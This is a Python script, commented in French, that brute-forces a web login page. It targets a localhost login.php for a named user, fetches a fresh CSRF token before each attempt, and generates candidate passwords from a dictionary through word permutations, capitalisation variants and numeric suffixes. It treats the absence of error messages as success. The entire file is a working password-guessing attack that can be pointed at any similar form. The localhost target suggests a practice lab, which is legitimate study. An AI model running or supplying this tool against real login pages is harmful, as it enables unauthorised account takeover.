import requests
from bs4 import BeautifulSoup
import itertools

# Paramètres de la cible
TARGET_URL = "http://localhost/siteweb/pages/login.php"
USERNAME = "hexalos"
WORDLIST = "dico.txt"

def get_csrf_token(session):
    """Récupère le token CSRF généré par la page de login."""
    response = session.get(TARGET_URL)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find('input', {'name': 'csrf_token'})
    if token_input:
        return token_input['value']
    return None

def generate_wordlist(base_words):
    candidates = []
    
    # 1. Ajout des mots simples du fichier (et leur variante majuscule)
    for w in base_words:
        candidates.append(w)
        if w.capitalize() not in candidates:
            candidates.append(w.capitalize())

    # 2. Séparation des mots texte et des chiffres du dictionnaire
    generic_passwords = {"admin", "123456", "azerty", "motdepasse", "Password123!", "root"}
    text_words = [w for w in base_words if w not in generic_passwords and not w.isdigit()]
    raw_numbers = [w for w in base_words if w.isdigit()]
    
    # Suffixes numériques (chiffres seuls + reconstitution de tous les chiffres collés)
    number_suffixes = [""] + raw_numbers
    if raw_numbers:
        number_suffixes.append("".join(raw_numbers))

    # 3. Autonomie totale : tester toutes les permutations possibles des mots du dico
    # (par exemple de 2 mots jusqu'au nombre total de mots textuels trouvés)
    for r in range(1, len(text_words) + 1):
        for perm in itertools.permutations(text_words, r):
            # Concaténation des mots de la permutation
            base_str = "".join(perm)
            
            # Génération automatique des variantes de casse pour cette combinaison :
            # - Tout en minuscules
            # - Première lettre en majuscule (Capitalize)
            # - Chaque mot individuellement avec une majuscule (CamelCase)
            variants = {
                base_str.lower(),
                base_str.capitalize(),
                "".join([word.capitalize() for word in perm])
            }
            
            # 4. Association avec les suffixes numériques
            for variant in variants:
                candidates.append(variant)
                for num in number_suffixes:
                    if num:
                        candidates.append(variant + num)

    return candidates

def brute_force():
    print(f"[*] Démarrage de l'attaque sur {USERNAME} à l'adresse {TARGET_URL}")
    
    try:
        with open(WORDLIST, 'r', encoding='utf-8') as file:
            base_words = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("[!] Fichier dictionnaire introuvable.")
        return

    passwords_to_test = generate_wordlist(base_words)
    print(f"[*] {len(passwords_to_test)} mots de passe générés à partir de {WORDLIST}.\n")

    with requests.Session() as session:
        for password in passwords_to_test:
            # 1. Récupération du nouveau token CSRF
            csrf_token = get_csrf_token(session)
            if not csrf_token:
                print("[-] Impossible de trouver le token CSRF.")
                break
                
            print(f"[*] Tentative : {password} (Token: {csrf_token[:8]}...)")
            
            # 2. Envoi de la requête POST
            data = {
                'identifiant': USERNAME,
                'password': password,
                'csrf_token': csrf_token
            }
            
            response = session.post(TARGET_URL, data=data)
            
            # 3. Analyse de la réponse
            if "Identifiants incorrects" not in response.text and "Erreur de sécurité" not in response.text:
                print(f"\n[+++] SUCCÈS ! Le mot de passe pour {USERNAME} est : {password}")
                break

if __name__ == "__main__":
    brute_force()